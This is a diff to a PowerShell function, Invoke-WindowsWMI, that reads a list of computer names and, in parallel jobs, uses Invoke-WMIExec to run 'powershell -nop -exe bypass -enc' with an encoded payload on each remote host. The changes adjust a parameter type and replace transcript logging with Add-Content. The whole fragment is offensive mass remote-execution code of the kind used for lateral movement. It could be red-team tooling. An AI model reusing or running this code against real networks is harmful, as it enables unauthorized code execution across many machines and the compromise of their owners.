@@ -9,7 +9,7 @@ function Invoke-WindowsWMI{
         $Computers = ".\windows.txt",
         
         [Parameter(Mandatory=$true)]
-        $Url
+        [string]$Url
     )
     #Import ComputerNames
     if(Test-Path $Computers){
@@ -47,9 +47,8 @@ function Invoke-WindowsWMI{
             param($Inputargs)
             $Location = $Inputargs.Location
             $Url = $Inputargs.Url
-            Start-Transcript -Path "$Location\$($_)"
-            Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $Url"
-            Stop-Transcript
+            $output = Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $Url"
+            Add-Content -Path "$Location\$($_)" -Value $output
     } | Wait-RSJob -ShowProgress
     $errors=Get-RSJob | where {$_.HasErrors -eq $true}
     if($errors){
